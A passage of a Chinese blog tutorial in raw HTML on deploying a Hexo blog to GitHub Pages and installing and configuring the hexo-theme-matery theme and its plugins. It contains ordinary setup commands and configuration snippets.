data-original="https://cdn.jsdelivr.net/gh/Yafine/Yafine-imgs/images/20191117222746.png" alt="">)<img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/Yafine/Yafine-imgs/images/20191117222746.png" alt=""></p><p>点击<strong>New SSH key</strong> 将之前复制的内容粘帖到Key的框中。 上面的<strong>Title</strong>可以随意，点击<strong>Add SSH key</strong> 完成添加。</p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/Yafine/Yafine-imgs/images/20191117223049.png" alt="">)<img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/Yafine/Yafine-imgs/images/20191117223049.png" alt=""></p><p>然后回到Git的命令行界面，测试一下是否与GitHub连接成功。输入下面的命令行：</p><pre class=" language-bash"><code class="language-bash"><span class="token function">ssh</span> -T git@github.com</code></pre><p>点击回车，然后会出现一个询问内容，输入<code>yes</code>，回车，会出现一段内容，<code>Hi &lt;account name&gt;! You've successfully authenticated, but GitHub doesnot provide shell access.</code>。 说明连接成功。此处这个<code>&lt;account name&gt;</code>应该是你Github的用户名。</p><ol start="4"><li>进入博客站点目录，用文本编辑器打开<code>_config.yml</code>，这个<code>_config.yml</code>是博客的配置文件，在以后的博客修改，如个性化修改，博客SEO优化等都会使用到，修改如下图的几个地方：</li></ol><pre class=" language-yml"><code class="language-yml">title: 你的博客名subtitle: 博客的副标题，有些主题支持description: 博客描述keywords: 博客关键词author: 作者，在文章中显示language: 博客语言语种   timezone: 时区</code></pre><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/Yafine/Yafine-imgs/images/20191117224138.png" alt="">)<img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/Yafine/Yafine-imgs/images/20191117224138.png" alt=""></p><p>滑到文件最底部，有一个deploy，在deploy下面添加一个repo项 ，一个branch项。填入如下代码，并如下图所示：</p><pre class=" language-yml"><code class="language-yml">type: gitrepo: git@github.com:Github用户名/github用户名.github.io.git  //也可使用https地址，如：https://github.com/Github用户名/Github用户名.github.io.git            branch: master</code></pre><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/Yafine/Yafine-imgs/images/20191117224151.png" alt="">)<img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/Yafine/Yafine-imgs/images/20191117224151.png" alt=""></p><ol start="5"><li>最后就是生成页面，并发布至Github Pages，执行如下命令：</li></ol><pre class=" language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># Hexo会根据配置文件渲染出一套静态页面</span>hexo g<span class="token comment" spellcheck="true"># 将上一步渲染出的一系列文件上传至至Github Pages</span>hexo d<span class="token comment" spellcheck="true"># 也可以直接输入此命令，直接完成渲染和上传</span>hexo g -d</code></pre><p>上传完成后，在浏览器中打开<strong>https://&lt;用户名&gt;.github.io</strong>，查看上传的网页。如果页面变成了之前本地调试时的样子，说明上传以及完成了。没变的话查看一下上传时命令行窗口的信息有没有错误信息，没有的话清除一下浏览器缓存试试。</p><h1 id="五、hexo博客主题安装以及一些个性化修改"><a href="#五、hexo博客主题安装以及一些个性化修改" class="headerlink" title="五、hexo博客主题安装以及一些个性化修改"></a>五、hexo博客主题安装以及一些个性化修改</h1><blockquote><p><strong>转自：</strong><a href="https://github.com/blinkfox/hexo-theme-matery/blob/develop/README.md" target="_blank" rel="noopener">🇺🇸English Document</a> | <a href="https://blinkfox.github.io/" target="_blank" rel="noopener">演示示例</a> | QQ 交流群1（已满）: <a href="https://jq.qq.com/?_wv=1027&amp;k=5zMDYHT" target="_blank" rel="noopener"><code>926552981</code></a> | QQ 交流群2（推荐）: <a href="https://jq.qq.com/?_wv=1027&amp;k=53q2Ayp" target="_blank" rel="noopener"><code>971887688</code></a></p><p>这是一个采用 <code>Material Design</code> 和响应式设计的 Hexo 博客主题。</p></blockquote><h2 id="主题特性"><a href="#主题特性" class="headerlink" title="主题特性"></a>主题特性</h2><ul><li>简单漂亮，文章内容美观易读</li><li><a href="https://material.io/" target="_blank" rel="noopener">Material Design</a> 设计</li><li>响应式设计，博客在桌面端、平板、手机等设备上均能很好的展现</li><li>首页轮播文章及每天动态切换 <code>Banner</code> 图片</li><li>瀑布流式的博客文章列表（文章无特色图片时会有 <code>24</code> 张漂亮的图片代替）</li><li>时间轴式的归档页</li><li><strong>词云</strong>的标签页和<strong>雷达图</strong>的分类页</li><li>丰富的关于我页面（包括关于我、文章统计图、我的项目、我的技能、相册等）</li><li>可自定义的数据的友情链接页面</li><li>支持文章置顶和文章打赏</li><li>支持 <code>MathJax</code></li><li><code>TOC</code> 目录</li><li>可设置复制文章内容时追加版权信息</li><li>可设置阅读文章时做密码验证</li><li><a href="https://gitalk.github.io/" target="_blank" rel="noopener">Gitalk</a>、<a href="https://imsun.github.io/gitment/" target="_blank" rel="noopener">Gitment</a>、<a href="https://valine.js.org/" target="_blank" rel="noopener">Valine</a> 和 <a href="https://disqus.com/" target="_blank" rel="noopener">Disqus</a> 评论模块（推荐使用 <code>Gitalk</code>）</li><li>集成了<a href="http://busuanzi.ibruce.info/" target="_blank" rel="noopener">不蒜子统计</a>、谷歌分析（<code>Google Analytics</code>）和文章字数统计等功能</li><li>支持在首页的音乐播放和视频播放功能</li><li>支持<code>emoji</code>表情，用<code>markdown emoji</code>语法书写直接生成对应的能<strong>跳跃</strong>的表情。</li><li>支持 <a href="http://www.daovoice.io/" target="_blank" rel="noopener">DaoVoice</a>、<a href="https://www.tidio.com/" target="_blank" rel="noopener">Tidio</a> 在线聊天功能。</li></ul><h2 id="1-主题下载与安装"><a href="#1-主题下载与安装" class="headerlink" title="1. 主题下载与安装"></a>1. 主题下载与安装</h2><p>点击 <a href="https://codeload.github.com/blinkfox/hexo-theme-matery/zip/master" target="_blank" rel="noopener">传送门</a> 下载 <code>master</code> 分支的最新稳定版的代码，解压缩后，将 <code>hexo-theme-matery</code> 的文件夹复制到你 Hexo 的 <code>themes</code> 文件夹中即可。</p><p>当然你也可以在你的站点目录文件夹下使用 <code>git clone</code> 命令来下载：直接在站点根目录下执行下面的命令，即可进行主题的下载，主题有两个版本，稳定版本和最新版本(不定期更新优化)，自主选择版本。</p><pre class=" language-bash"><code class="language-bash"><span class="token function">git</span> clone https://github.com/blinkfox/hexo-theme-matery themes/matery     <span class="token comment" spellcheck="true"># 稳定版</span><span class="token function">git</span> clone -b develop https://github.com/blinkfox/hexo-theme-matery themes/matery   <span class="token comment" spellcheck="true">#最新版(不定期进行优化更新)</span></code></pre><h2 id="2-主题配置"><a href="#2-主题配置" class="headerlink" title="2. 主题配置"></a>2. 主题配置</h2><h3 id="2-1-切换主题"><a href="#2-1-切换主题" class="headerlink" title="2.1 切换主题"></a>2.1 切换主题</h3><blockquote><p><strong>注意：</strong>首先需要明白什么是站点配置文件，什么是主题配置文件，站点配置文件就是根目录下的配置文件，比如我的博客文件在<code>F:\blog</code>下，那么站点配置文件就是<code>F:\blog\_config.yml</code>，主题配置文件就是<code>F:\blog\themes\matery\_config.yml</code>。</p><p>另外注意，配置文件中的标点符号不要出现中文格式的标点符号，不然运行会出错。</p></blockquote><p>主题下载完成后，将站点配置文件中的<code>theme</code>值修改为你下载主题的文件名，此处为<code>matery</code>，那么值就修改为<code>theme: matery</code>。</p><p>一些站点配置文件的其他地方的修改：</p><ul><li>语言选择：如果为中文用户，则在<code>language:</code>后添加值<code>zh-CN</code>，如果不修改，默认为英语；</li><li>网址修改：<code>url:</code>的值为你的网址名，如<code>http://xxxx.github.io</code>，如果有域名，则修改为你的域名即可，至于有关域名的修改解析，后面我会说到，这里先不说了。</li><li>站点配置文件有个<code>per_page属性</code>，建议修改为6的倍数，这样网站在适应设备时，有较好的显示效果。</li></ul><h3 id="2-2-新建标签-tags-页面"><a href="#2-2-新建标签-tags-页面" class="headerlink" title="2.2 新建标签 tags 页面"></a>2.2 新建标签 tags 页面</h3><p><code>tags</code> 页是用来展示所有标签的页面，如果在你的博客 <code>source</code> 目录下还没有 <code>tags/index.md</code> 文件，那么你就需要新建一个，命令如下：</p><pre class=" language-bash"><code class="language-bash">hexo new page <span class="token string">"tags"</span></code></pre><p>编辑你刚刚新建的页面文件 <code>/source/tags/index.md</code>，至少需要以下内容：</p><pre class=" language-yaml"><code class="language-yaml"><span class="token punctuation">---</span><span class="token key atrule">title</span><span class="token punctuation">:</span> tags<span class="token key atrule">date</span><span class="token punctuation">:</span> <span class="token datetime number">2018-09-30 18:23:38</span><span class="token key atrule">type</span><span class="token punctuation">:</span> <span class="token string">"tags"</span><span class="token key atrule">layout</span><span class="token punctuation">:</span> <span class="token string">"tags"</span><span class="token punctuation">---</span></code></pre><h3 id="2-3-新建分类-categories-页面"><a href="#2-3-新建分类-categories-页面" class="headerlink" title="2.3 新建分类 categories 页面"></a>2.3 新建分类 categories 页面</h3><p><code>categories</code> 页是用来展示所有分类的页面，如果在你的博客 <code>source</code> 目录下还没有 <code>categories/index.md</code> 文件，那么你就需要新建一个，命令如下：</p><pre class=" language-bash"><code class="language-bash">hexo new page <span class="token string">"categories"</span></code></pre><p>编辑你刚刚新建的页面文件 <code>/source/categories/index.md</code>，至少需要以下内容：</p><pre class=" language-yaml"><code class="language-yaml"><span class="token punctuation">---</span><span class="token key atrule">title</span><span class="token punctuation">:</span> categories<span class="token key atrule">date</span><span class="token punctuation">:</span> <span class="token datetime number">2018-09-30 17:25:30</span><span class="token key atrule">type</span><span class="token punctuation">:</span> <span class="token string">"categories"</span><span class="token key atrule">layout</span><span class="token punctuation">:</span> <span class="token string">"categories"</span><span class="token punctuation">---</span></code></pre><h3 id="2-4-新建关于我-about-页面"><a href="#2-4-新建关于我-about-页面" class="headerlink" title="2.4 新建关于我 about 页面"></a>2.4 新建关于我 about 页面</h3><p><code>about</code> 页是用来展示<strong>关于我和我的博客</strong>信息的页面，如果在你的博客 <code>source</code> 目录下还没有 <code>about/index.md</code> 文件，那么你就需要新建一个，命令如下：</p><pre class=" language-bash"><code class="language-bash">hexo new page <span class="token string">"about"</span></code></pre><p>编辑你刚刚新建的页面文件 <code>/source/about/index.md</code>，至少需要以下内容：</p><pre class=" language-yaml"><code class="language-yaml"><span class="token punctuation">---</span><span class="token key atrule">title</span><span class="token punctuation">:</span> about<span class="token key atrule">date</span><span class="token punctuation">:</span> <span class="token datetime number">2018-09-30 17:25:30</span><span class="token key atrule">type</span><span class="token punctuation">:</span> <span class="token string">"about"</span><span class="token key atrule">layout</span><span class="token punctuation">:</span> <span class="token string">"about"</span><span class="token punctuation">---</span></code></pre><h3 id="2-5-新建留言板-contact-页面-可选"><a href="#2-5-新建留言板-contact-页面-可选" class="headerlink" title="2.5 新建留言板 contact 页面 (可选)"></a>2.5 新建留言板 contact 页面 (可选)</h3><p><code>contact</code> 页是用来展示<strong>留言板</strong>信息的页面，如果在你的博客 <code>source</code> 目录下还没有 <code>contact/index.md</code> 文件，那么你就需要新建一个，命令如下：</p><pre class=" language-bash"><code class="language-bash">hexo new page <span class="token string">"contact"</span></code></pre><p>编辑你刚刚新建的页面文件 <code>/source/contact/index.md</code>，至少需要以下内容：</p><pre class=" language-yaml"><code class="language-yaml"><span class="token punctuation">---</span><span class="token key atrule">title</span><span class="token punctuation">:</span> contact<span class="token key atrule">date</span><span class="token punctuation">:</span> <span class="token datetime number">2018-09-30 17:25:30</span><span class="token key atrule">type</span><span class="token punctuation">:</span> <span class="token string">"contact"</span><span class="token key atrule">layout</span><span class="token punctuation">:</span> <span class="token string">"contact"</span><span class="token punctuation">---</span></code></pre><blockquote><p><strong>注</strong>：本留言板功能依赖于第三方评论系统，请<strong>激活</strong>你的评论系统才有效果。并且在主题的 <code>_config.yml</code> 文件中，第 <code>19</code> 至 <code>21</code> 行的“<strong>菜单</strong>”配置，取消关于留言板的注释即可。</p></blockquote><h3 id="2-6-新建友情链接-friends-页面-可选"><a href="#2-6-新建友情链接-friends-页面-可选" class="headerlink" title="2.6 新建友情链接 friends 页面 (可选)"></a>2.6 新建友情链接 friends 页面 (可选)</h3><p><code>friends</code> 页是用来展示<strong>友情链接</strong>信息的页面，如果在你的博客 <code>source</code> 目录下还没有 <code>friends/index.md</code> 文件，那么你就需要新建一个，命令如下：</p><pre class=" language-bash"><code class="language-bash">hexo new page <span class="token string">"friends"</span></code></pre><p>编辑你刚刚新建的页面文件 <code>/source/friends/index.md</code>，至少需要以下内容：</p><pre class=" language-yaml"><code class="language-yaml"><span class="token punctuation">---</span><span class="token key atrule">title</span><span class="token punctuation">:</span> friends<span class="token key atrule">date</span><span class="token punctuation">:</span> <span class="token datetime number">2018-12-12 21:25:30</span><span class="token key atrule">type</span><span class="token punctuation">:</span> <span class="token string">"friends"</span><span class="token key atrule">layout</span><span class="token punctuation">:</span> <span class="token string">"friends"</span><span class="token punctuation">---</span></code></pre><p>同时，在你的博客 <code>source</code> 目录下新建 <code>_data</code> 目录，在 <code>_data</code> 目录中新建 <code>friends.json</code> 文件，文件内容如下所示：</p><pre class=" language-json"><code class="language-json"><span class="token punctuation">[</span><span class="token punctuation">{</span>    <span class="token property">"avatar"</span><span class="token operator">:</span> <span class="token string">"http://image.luokangyuan.com/1_qq_27922023.jpg"</span><span class="token punctuation">,</span>    <span class="token property">"name"</span><span class="token operator">:</span> <span class="token string">"码酱"</span><span class="token punctuation">,</span>    <span class="token property">"introduction"</span><span class="token operator">:</span> <span class="token string">"我不是大佬，只是在追寻大佬的脚步"</span><span class="token punctuation">,</span>    <span class="token property">"url"</span><span class="token operator">:</span> <span class="token string">"http://luokangyuan.com/"</span><span class="token punctuation">,</span>    <span class="token property">"title"</span><span class="token operator">:</span> <span class="token string">"前去学习"</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>    <span class="token property">"avatar"</span><span class="token operator">:</span> <span class="token string">"http://image.luokangyuan.com/4027734.jpeg"</span><span class="token punctuation">,</span>    <span class="token property">"name"</span><span class="token operator">:</span> <span class="token string">"闪烁之狐"</span><span class="token punctuation">,</span>    <span class="token property">"introduction"</span><span class="token operator">:</span> <span class="token string">"编程界大佬，技术牛，人还特别好，不懂的都可以请教大佬"</span><span class="token punctuation">,</span>    <span class="token property">"url"</span><span class="token operator">:</span> <span class="token string">"https://blinkfox.github.io/"</span><span class="token punctuation">,</span>    <span class="token property">"title"</span><span class="token operator">:</span> <span class="token string">"前去学习"</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>    <span class="token property">"avatar"</span><span class="token operator">:</span> <span class="token string">"http://image.luokangyuan.com/avatar.jpg"</span><span class="token punctuation">,</span>    <span class="token property">"name"</span><span class="token operator">:</span> <span class="token string">"ja_rome"</span><span class="token punctuation">,</span>    <span class="token property">"introduction"</span><span class="token operator">:</span> <span class="token string">"平凡的脚步也可以走出伟大的行程"</span><span class="token punctuation">,</span>    <span class="token property">"url"</span><span class="token operator">:</span> <span class="token string">"https://me.csdn.net/jlh912008548"</span><span class="token punctuation">,</span>    <span class="token property">"title"</span><span class="token operator">:</span> <span class="token string">"前去学习"</span><span class="token punctuation">}</span><span class="token punctuation">]</span></code></pre><h3 id="2-7-菜单导航配置"><a href="#2-7-菜单导航配置" class="headerlink" title="2.7 菜单导航配置"></a>2.7 菜单导航配置</h3><h4 id="2-7-1-配置基本菜单导航的名称、路径url和图标icon"><a href="#2-7-1-配置基本菜单导航的名称、路径url和图标icon" class="headerlink" title="2.7.1. 配置基本菜单导航的名称、路径url和图标icon."></a>2.7.1. 配置基本菜单导航的名称、路径url和图标icon.</h4><ol start="2"><li>菜单导航名称可以是中文也可以是英文(如：<code>Index</code>或<code>主页</code>)</li><li>图标icon 可以在<a href="https://fontawesome.com/icons" target="_blank" rel="noopener">Font Awesome</a> 中查找</li></ol><pre class=" language-yaml"><code class="language-yaml"><span class="token key atrule">menu</span><span class="token punctuation">:</span>  <span class="token key atrule">Index</span><span class="token punctuation">:</span>    <span class="token key atrule">url</span><span class="token punctuation">:</span> /    <span class="token key atrule">icon</span><span class="token punctuation">:</span> fas fa<span class="token punctuation">-</span>home  <span class="token key atrule">Tags</span><span class="token punctuation">:</span>    <span class="token key atrule">url</span><span class="token punctuation">:</span> /tags    <span class="token key atrule">icon</span><span class="token punctuation">:</span> fas fa<span class="token punctuation">-</span>tags  <span class="token key atrule">Categories</span><span class="token punctuation">:</span>    <span class="token key atrule">url</span><span class="token punctuation">:</span> /categories    <span class="token key atrule">icon</span><span class="token punctuation">:</span> fas fa<span class="token punctuation">-</span>bookmark  <span class="token key atrule">Archives</span><span class="token punctuation">:</span>    <span class="token key atrule">url</span><span class="token punctuation">:</span> /archives    <span class="token key atrule">icon</span><span class="token punctuation">:</span> fas fa<span class="token punctuation">-</span>archive  <span class="token key atrule">About</span><span class="token punctuation">:</span>    <span class="token key atrule">url</span><span class="token punctuation">:</span> /about    <span class="token key atrule">icon</span><span class="token punctuation">:</span> fas fa<span class="token punctuation">-</span>user<span class="token punctuation">-</span>circle  <span class="token key atrule">Friends</span><span class="token punctuation">:</span>    <span class="token key atrule">url</span><span class="token punctuation">:</span> /friends    <span class="token key atrule">icon</span><span class="token punctuation">:</span> fas fa<span class="token punctuation">-</span>address<span class="token punctuation">-</span>book</code></pre><h4 id="2-7-2-二级菜单配置方法"><a href="#2-7-2-二级菜单配置方法" class="headerlink" title="2.7.2. 二级菜单配置方法"></a>2.7.2. 二级菜单配置方法</h4><p>如果你需要二级菜单则可以在原基本菜单导航的基础上如下操作</p><ol start="2"><li>在需要添加二级菜单的一级菜单下添加<code>children</code>关键字(如:<code>About</code>菜单下添加<code>children</code>)</li><li>在<code>children</code>下创建二级菜单的 名称name,路径url和图标icon.</li><li>注意每个二级菜单模块前要加 <code>-</code>.</li><li>注意缩进格式</li></ol><pre class=" language-yaml"><code class="language-yaml"><span class="token key atrule">menu</span><span class="token punctuation">:</span>  <span class="token key atrule">Index</span><span class="token punctuation">:</span>    <span class="token key atrule">url</span><span class="token punctuation">:</span> /    <span class="token key atrule">icon</span><span class="token punctuation">:</span> fas fa<span class="token punctuation">-</span>home  <span class="token key atrule">Tags</span><span class="token punctuation">:</span>    <span class="token key atrule">url</span><span class="token punctuation">:</span> /tags    <span class="token key atrule">icon</span><span class="token punctuation">:</span> fas fa<span class="token punctuation">-</span>tags  <span class="token key atrule">Categories</span><span class="token punctuation">:</span>    <span class="token key atrule">url</span><span class="token punctuation">:</span> /categories    <span class="token key atrule">icon</span><span class="token punctuation">:</span> fas fa<span class="token punctuation">-</span>bookmark  <span class="token key atrule">Archives</span><span class="token punctuation">:</span>    <span class="token key atrule">url</span><span class="token punctuation">:</span> /archives    <span class="token key atrule">icon</span><span class="token punctuation">:</span> fas fa<span class="token punctuation">-</span>archive  <span class="token key atrule">About</span><span class="token punctuation">:</span>    <span class="token key atrule">url</span><span class="token punctuation">:</span> /about    <span class="token key atrule">icon</span><span class="token punctuation">:</span> fas fa<span class="token punctuation">-</span>user<span class="token punctuation">-</span>circle<span class="token punctuation">-</span>o  <span class="token key atrule">Friends</span><span class="token punctuation">:</span>    <span class="token key atrule">url</span><span class="token punctuation">:</span> /friends    <span class="token key atrule">icon</span><span class="token punctuation">:</span> fas fa<span class="token punctuation">-</span>address<span class="token punctuation">-</span>book  <span class="token key atrule">Medias</span><span class="token punctuation">:</span>    <span class="token key atrule">icon</span><span class="token punctuation">:</span> fas fa<span class="token punctuation">-</span>list    <span class="token key atrule">children</span><span class="token punctuation">:</span>      <span class="token punctuation">-</span> <span class="token key atrule">name</span><span class="token punctuation">:</span> Musics        <span class="token key atrule">url</span><span class="token punctuation">:</span> /musics        <span class="token key atrule">icon</span><span class="token punctuation">:</span> fas fa<span class="token punctuation">-</span>music      <span class="token punctuation">-</span> <span class="token key atrule">name</span><span class="token punctuation">:</span> Movies        <span class="token key atrule">url</span><span class="token punctuation">:</span> /movies        <span class="token key atrule">icon</span><span class="token punctuation">:</span> fas fa<span class="token punctuation">-</span>film      <span class="token punctuation">-</span> <span class="token key atrule">name</span><span class="token punctuation">:</span> Books        <span class="token key atrule">url</span><span class="token punctuation">:</span> /books        <span class="token key atrule">icon</span><span class="token punctuation">:</span> fas fa<span class="token punctuation">-</span>book      <span class="token punctuation">-</span> <span class="token key atrule">name</span><span class="token punctuation">:</span> Galleries        <span class="token key atrule">url</span><span class="token punctuation">:</span> /galleries        <span class="token key atrule">icon</span><span class="token punctuation">:</span> fas fa<span class="token punctuation">-</span>image</code></pre><h3 id="2-8-添加emoji表情支持（可选的）"><a href="#2-8-添加emoji表情支持（可选的）" class="headerlink" title="2.8 添加emoji表情支持（可选的）"></a>2.8 添加emoji表情支持（可选的）</h3><p>本主题新增了对<code>emoji</code>表情的支持，使用到了 <a href="https://npm.taobao.org/package/hexo-filter-github-emojis" target="_blank" rel="noopener">hexo-filter-github-emojis</a> 的 Hexo 插件来支持 <code>emoji</code>表情的生成，把对应的<code>markdown emoji</code>语法（<code>::</code>,例如：<code>:smile:</code>）转变成会跳跃的<code>emoji</code>表情，安装命令如下：</p><pre class=" language-bash"><code class="language-bash"><span class="token function">npm</span> <span class="token function">install</span> hexo-filter-github-emojis --save</code></pre><p>在 Hexo 根目录下的 <code>_config.yml</code> 文件中，新增以下的配置项：</p><pre class=" language-yaml"><code class="language-yaml"><span class="token key atrule">githubEmojis</span><span class="token punctuation">:</span>  <span class="token key atrule">enable</span><span class="token punctuation">:</span> <span class="token boolean important">true</span>  <span class="token key atrule">className</span><span class="token punctuation">:</span> github<span class="token punctuation">-</span>emoji  <span class="token key atrule">inject</span><span class="token punctuation">:</span> <span class="token boolean important">true</span>  <span class="token key atrule">styles</span><span class="token punctuation">:</span>  customEmojis<span class="token punctuation">:</span></code></pre><p>执行 <code>hexo clean &amp;&amp; hexo g</code> 重新生成博客文件，然后就可以在文章中对应位置看到你用<code>emoji</code>语法写的表情了。</p><h3 id="2-9-代码高亮"><a href="#2-9-代码高亮" class="headerlink" title="2.9 代码高亮"></a>2.9 代码高亮</h3><p>由于 Hexo 自带的代码高亮主题显示不好看，所以主题中使用到了 <a href="https://github.com/ele828/hexo-prism-plugin" target="_blank" rel="noopener">hexo-prism-plugin</a> 的 Hexo 插件来做代码高亮，安装命令如下：</p><pre class=" language-bash"><code class="language-bash"><span class="token function">npm</span> i -S hexo-prism-plugin</code></pre><p>然后，修改 Hexo 根目录下 <code>_config.yml</code> 文件中 <code>highlight.enable</code> 的值为 <code>false</code>，并新增 <code>prism</code> 插件相关的配置，主要配置如下：</p><pre class=" language-yaml"><code class="language-yaml"><span class="token key atrule">prism_plugin</span><span class="token punctuation">:</span>  <span class="token key atrule">mode</span><span class="token punctuation">:</span> <span class="token string">'preprocess'</span>    <span class="token comment" spellcheck="true"># realtime/preprocess</span>  <span class="token key atrule">theme</span><span class="token punctuation">:</span> <span class="token string">'tomorrow'</span>  <span class="token key atrule">line_number</span><span class="token punctuation">:</span> <span class="token boolean important">false    </span><span class="token comment" spellcheck="true"># default false</span>  custom_css<span class="token punctuation">:</span></code></pre><h3 id="2-10-搜索"><a href="#2-10-搜索" class="headerlink" title="2.10 搜索"></a>2.10 搜索</h3><p>本主题中还使用到了 <a href="https://github.com/wzpan/hexo-generator-search" target="_blank" rel="noopener">hexo-generator-search</a> 的 Hexo 插件来做内容搜索，安装命令如下：</p><pre class=" language-bash"><code class="language-bash"><span class="token function">npm</span> <span class="token function">install</span> hexo-generator-search --save</code></pre><p>在 Hexo 根目录下的 <code>_config.yml</code> 文件中，新增以下的配置项：</p><pre class=" language-yaml"><code class="language-yaml"><span class="token key atrule">search</span><span class="token punctuation">:</span>  <span class="token key atrule">path</span><span class="token punctuation">:</span> search.xml  <span class="token key atrule">field</span><span class="token punctuation">:</span> post</code></pre><h3 id="2-11-中文链接转拼音（可选的）"><a href="#2-11-中文链接转拼音（可选的）" class="headerlink" title="2.11 中文链接转拼音（可选的）"></a>2.11 中文链接转拼音（可选的）</h3><p>如果你的文章名称是中文的，那么 Hexo 默认生成的永久链接也会有中文，这样不利于 <code>SEO</code>，且 <code>gitment</code> 评论对中文链接也不支持。我们可以用 <a href="https://github.com/viko16/hexo-permalink-pinyin" target="_blank" rel="noopener">hexo-permalink-pinyin</a> Hexo 插件使在生成文章时生成中文拼音的永久链接。</p><p>安装命令如下：</p><pre class=" language-bash"><code class="language-bash"><span class="token function">npm</span> i hexo-permalink-pinyin --save</code></pre><p>“ i ”指的是install</p><p>卸载命令</p><pre><code>npm uninstall hexo-permalink-pinyin</code></pre><p>在 Hexo 根目录下的 <code>_config.yml</code> 文件中，新增以下的配置项：</p><pre class=" language-yaml"><code class="language-yaml"><span class="token key atrule">permalink_pinyin</span><span class="token punctuation">:</span>  <span class="token key atrule">enable</span><span class="token punctuation">:</span> <span class="token boolean important">true</span>  <span class="token key atrule">separator</span><span class="token punctuation">:</span> <span class="token string">'-'</span> <span class="token comment" spellcheck="true"># default: '-'</span></code></pre><blockquote><p><strong>注</strong>：除了此插件外，<a href="https://github.com/rozbo/hexo-abbrlink" target="_blank" rel="noopener">hexo-abbrlink</a> 插件也可以生成非中文的链接。</p></blockquote><h3 id="2-12-文章字数统计插件（可选的）"><a href="#2-12-文章字数统计插件（可选的）" class="headerlink" title="2.12 文章字数统计插件（可选的）"></a>2.12 文章字数统计插件（可选的）</h3><p>如果你想要在文章中显示文章字数、阅读时长信息，可以安装 <a href="https://github.com/willin/hexo-wordcount" target="_blank" rel="noopener">hexo-wordcount</a>插件。</p><p>安装命令如下：</p><pre class=" language-bash"><code class="language-bash"><span class="token function">npm</span> i --save hexo-wordcount</code></pre><p>然后只需在本主题下的 <code>_config.yml</code> 文件中，激活以下配置项即可：</p><pre class=" language-yaml"><code class="language-yaml"><span class="token key atrule">wordCount</span><span class="token punctuation">:</span>  <span class="token key atrule">enable</span><span class="token punctuation">:</span> <span class="token boolean important">false </span><span class="token comment" spellcheck="true"># 将这个值设置为 true 即可.</span>  <span class="token key atrule">postWordCount</span><span class="token punctuation">:</span> <span class="token boolean important">true</span>  <span class="token key atrule">min2read</span><span class="token punctuation">:</span> <span class="token boolean important">true</span>  <span class="token key atrule">totalCount</span><span class="token punctuation">:</span> <span class="token boolean important">true</span></code></pre><h3 id="2-13-添加-RSS-订阅支持（可选的）"><a href="#2-13-添加-RSS-订阅支持（可选的）" class="headerlink" title="2.13 添加 RSS 订阅支持（可选的）"></a>2.13 添加 RSS 订阅支持（可选的）</h3><p>本主题中还使用到了 <a href="https://github.com/hexojs/hexo-generator-feed" target="_blank" rel="noopener">hexo-generator-feed</a> 的 Hexo 插件来做 <code>RSS</code>，安装命令如下：</p><pre class=" language-bash"><code class="language-bash"><span class="token function">npm</span> <span class="token function">install</span> hexo-generator-feed --save</code></pre><p>在 Hexo 根目录下的 <code>_config.yml</code> 文件中，新增以下的配置项：</p><pre class=" language-yaml"><code class="language-yaml"><span class="token key atrule">feed</span><span class="token punctuation">:</span>  <span class="token key atrule">type</span><span class="token punctuation">:</span> atom  <span class="token key atrule">path</span><span class="token punctuation">:</span> atom.xml  <span class="token key atrule">limit</span><span class="token punctuation">:</span> <span class="token number">20</span>  <span class="token key atrule">hub</span><span class="token punctuation">:</span>  <span class="token key atrule">content</span><span class="token punctuation">:</span>  <span class="token key atrule">content_limit</span><span class="token punctuation">:</span> <span class="token number">140</span>  <span class="token key atrule">content_limit_delim</span><span class="token punctuation">:</span> <span class="token string">' '</span>  <span class="token key atrule">order_by</span><span class="token punctuation">:</span> <span class="token punctuation">-</span>date</code></pre><p>执行 <code>hexo clean &amp;&amp; hexo g</code> 重新生成博客文件，然后在 <code>public</code> 文件夹中即可看到 <code>atom.xml</code> 文件，说明你已经安装成功了。</p><h3 id="2-14-添加-DaoVoice-在线聊天功能（可选的）"><a href="#2-14-添加-DaoVoice-在线聊天功能（可选的）" class="headerlink" title="2.14 添加 DaoVoice 在线聊天功能（可选的）"></a>2.14 添加 <a href="http://www.daovoice.io/" target="_blank" rel="noopener">DaoVoice</a> 在线聊天功能（可选的）</h3><p>前往 <a href="http://www.daovoice.io/" target="_blank" rel="noopener">DaoVoice</a> 官网注册并且获取 <code>app_id</code>，并将 <code>app_id</code> 填入主题的 <code>_config.yml</code> 文件中</p><h3 id="2-15-添加-Tidio-在线聊天功能（可选的）"><a href="#2-15-添加-Tidio-在线聊天功能（可选的）" class="headerlink" title="2.15 添加 Tidio 在线聊天功能（可选的）"></a>2.15 添加 <a href="https://www.tidio.com/" target="_blank" rel="noopener">Tidio</a> 在线聊天功能（可选的）</h3><p>前往 <a href="https://www.tidio.com/" target="_blank" rel="noopener">Tidio</a> 官网注册并且获取 <code>Public Key</code>，并将 <code>Public Key</code> 填入主题的 <code>_config.yml</code> 文件中。</p><h3 id="2-16-修改页脚"><a href="#2-16-修改页脚" class="headerlink" title="2.16 修改页脚"></a>2.16 修改页脚</h3><p>页脚信息可能需要做定制化修改，而且它不便于做成配置信息，所以可能需要你自己去再修改和加工。修改的地方在主题文件的 <code>/layout/_partial/footer.ejs</code> 文件中，包括站点、使用的主题、访问量等。</p><h3 id="2-17-修改社交链接"><a href="#2-17-修改社交链接" class="headerlink" title="2.17 修改社交链接"></a>2.17 修改社交链接</h3><p>在主题的 <code>_config.yml</code> 文件中，默认支持 <code>QQ</code>、<code>GitHub</code> 和邮箱等的配置，你可以在主题文件的 <code>/layout/_partial/social-link.ejs</code> 文件中，新增、修改你需要的社交链接地址，增加链接可参考如下代码：</p><pre class=" language-html"><code 